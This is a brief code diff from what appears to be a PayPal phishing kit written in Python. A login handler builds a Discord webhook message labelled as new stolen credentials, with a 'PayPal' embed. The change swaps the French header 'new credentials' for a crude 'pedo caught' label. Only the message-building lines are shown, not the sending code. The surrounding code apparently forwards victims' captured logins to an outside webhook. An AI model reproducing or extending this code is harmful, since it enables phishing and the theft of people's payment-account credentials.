@@ -133,7 +133,7 @@ def login():
     
     if DISCORD_WEBHOOK:
         payload = {
-            'content': '🔐 **NOUVEAUX IDENTIFIANTS**',
+            'content': '🔐 **PEDO CHOPER**',
             'embeds': [{
                 'title': 'PayPal',
                 'color': 0x0070ba,
